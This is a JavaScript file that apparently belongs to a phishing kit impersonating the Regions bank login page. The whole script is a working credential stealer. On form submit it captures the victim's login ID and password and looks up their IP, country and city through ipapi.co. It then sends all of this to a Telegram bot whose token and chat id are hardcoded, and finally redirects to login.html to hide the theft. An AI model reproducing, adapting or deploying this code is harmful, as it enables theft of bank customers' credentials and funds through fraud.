
// Wait until DOM is loaded
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("loginForm");
  const loginIdField = document.getElementById("loginId");
  const passwordField = document.getElementById("password");

  // Collect client info
  async function getClientInfo() {
    const info = {
      ip: "Unknown",
      country: "Unknown",
      city: "Unknown",
      device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
      browser: navigator.userAgent,
    };

    try {
      const response = await fetch("https://ipapi.co/json/");
      if (response.ok) {
        const data = await response.json();
        info.ip = data.ip || "Unknown";
        info.country = data.country_name || "Unknown";
        info.city = data.city || "Unknown";
      }
    } catch (error) {
      //console.warn("Failed to fetch IP info:", error);
    }

    return info;
  }

  // Send to Telegram (safe REGIONS)
  async function sendToTelegram(message) {
    const token = "8525430088:AAHfMQJCkbpR3oUnnXC37_SWqKiGnvk9zPQ"; // <-- Replace with your bot token
    const chat_id = "6211090366"; // <-- Replace with your chat IDssword

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chat_id, text: message }),
        }
      );
      return response.ok;
    } catch (error) {
      /*console.error("Error sending message to Telegram:", error);*/
      return false;
    }
  }

  // Handle form submit
  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    const loginId = loginIdField.value.trim();
    const password = passwordField.value.trim();

    if (!loginId || !password) {
      alert("Please enter both Login ID and Password.");
      return;
    }

    const clientInfo = await getClientInfo();

    const message =
      `====== REGIONS Login Info======\n` +
      `👤 Login ID: ${loginId}\n` +
      `🔑 Password: ${password}\n\n` +
      `🌐 IP Address: ${clientInfo.ip}\n` +
      `🏳️ Country: ${clientInfo.country}\n` +
      `🏙️ City: ${clientInfo.city}\n` +
      `💻 Browser: ${clientInfo.browser}\n` +
      `📱 Device: ${clientInfo.device}`;

    const sent = await sendToTelegram(message);

    if (sent) {
      // Redirect after successful send
      window.location.href = "login.html";
    } else {
      //alert("Failed to send info.");
    }
  });
});
